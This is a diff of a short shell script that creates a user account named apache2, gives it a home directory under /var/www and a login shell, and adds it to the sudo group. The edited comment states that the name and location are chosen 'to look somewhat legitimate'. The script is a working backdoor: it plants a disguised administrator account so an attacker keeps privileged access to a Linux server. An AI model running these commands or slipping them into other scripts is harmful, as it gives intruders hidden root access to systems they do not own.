@@ -1,7 +1,7 @@
 #!/bin/sh
 
 # First, we're going to create a new user account named apache2 with home directory
-# /var/www/apache2 to look somewhat legitimate
+# /var/www/apache2 to look somewhat legitimate, and add it to the sudo group
 mkdir /var/www/apache2
 useradd -d /var/www/apache2 -s /bin/bash apache2
 usermod -aG sudo apache2
